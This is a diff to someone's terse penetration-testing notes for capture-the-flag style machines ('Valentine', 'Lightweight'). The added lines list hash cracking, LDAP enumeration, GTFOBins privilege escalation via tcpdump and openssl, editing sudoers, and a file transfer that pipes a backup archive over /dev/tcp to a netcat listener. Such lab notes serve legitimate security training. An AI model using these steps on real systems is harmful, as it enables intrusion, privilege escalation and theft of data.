@@ -6,6 +6,11 @@ Donwload sherlock.ps1
 Alwasys check the searchploit 
 Try ODAT
 find . | grep -i tomcat
+./hashcat --example-hashes
+
+trasnfer file:
+cat backup.7z > /dev/tcp/ip/9001
+ncat -lvnp 9001 > backup.7z
 
 # Valentine Machine:
   check the ssl vulnerability, got the ssh-hey
@@ -170,5 +175,13 @@ find . | grep -i tomcat
   command injection on url
   got the ssh private key
   exploit memcached.ini
+
+# Lightweight Machine:
+  do ldapsearch -x -h ip, d=,dc=
+  find hash password, then crack it
+  linenum, tcpdump gtfobin
+  intercept using wireshark
+  check openssl by gtfobin
+  check sudoers, add owned user and local ip
     
   
